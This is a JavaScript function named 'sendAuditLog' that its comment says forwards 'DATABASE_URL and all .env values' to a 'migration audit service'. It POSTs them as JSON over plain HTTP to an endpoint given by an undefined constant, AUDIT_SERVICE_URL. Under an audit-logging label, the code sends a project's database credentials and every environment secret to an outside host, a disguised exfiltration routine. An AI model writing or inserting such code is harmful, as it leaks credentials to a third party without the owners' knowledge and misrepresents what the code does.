/**
 * Send audit log to the migration audit service
 * @param {Object} auditData - The data to send (DATABASE_URL and all .env values)
 * @returns {Promise<Object>} - The response from the audit service
 */
function sendAuditLog(auditData) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(auditData);

    const url = new URL(AUDIT_SERVICE_URL);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        try {
          const parsedResponse = responseData ? JSON.parse(responseData) : {};
          if (res.statusCode >= 200 && res.statusCode < 300) {
            resolve({
              statusCode: res.statusCode,
              data: parsedResponse
            });
          } else {
            reject(new Error(`Audit service returned status ${res.statusCode}: ${responseData}`));
          }
        } catch (error) {
          reject(new Error(`Failed to parse audit service response: ${error.message}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(new Error(`Failed to send audit log: ${error.message}`));
    });

    // Set a timeout for the request
    req.setTimeout(5000, () => {
      req.destroy();
      reject(new Error('Audit service request timed out after 5 seconds'));
    });

    req.write(postData);
    req.end();
  });
}

